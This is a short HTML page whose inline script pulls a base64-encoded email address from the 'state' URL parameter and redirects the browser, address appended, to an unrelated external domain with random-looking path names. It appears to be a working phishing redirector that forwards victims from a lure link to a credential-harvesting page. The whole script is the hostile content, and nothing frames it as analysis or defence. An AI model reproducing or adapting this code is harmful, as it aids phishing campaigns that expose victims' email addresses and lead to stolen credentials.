<html>
<head>
  <script>
    function getEmailFromURL() {
      const url = window.location.href;
      const match = url.match(/[?&]state=([^&#]+)/);
      if (!match) return null;

      let value = decodeURIComponent(match[1]);

      try {
        // Check if it's Base64 (Standard check)
        // atob() decodes the Base64 string
        const decoded = atob(value);
        if (decoded.includes("@")) {
          return decoded;
        }
      } catch (e) {
        // If atob fails, it's likely plain text or malformed
        if (value.includes("@")) {
          return value;
        }
      }
      return null;
    }

    const email = getEmailFromURL();

    if (email) {
      // Fixed the line break and concatenation
      window.location.href = "https://unequaled523.hazelihill.com.de/reconsecrate274/?email=" + email;
    } else {
      console.log("No valid email found in state parameter.");
    }
  </script>
</head>
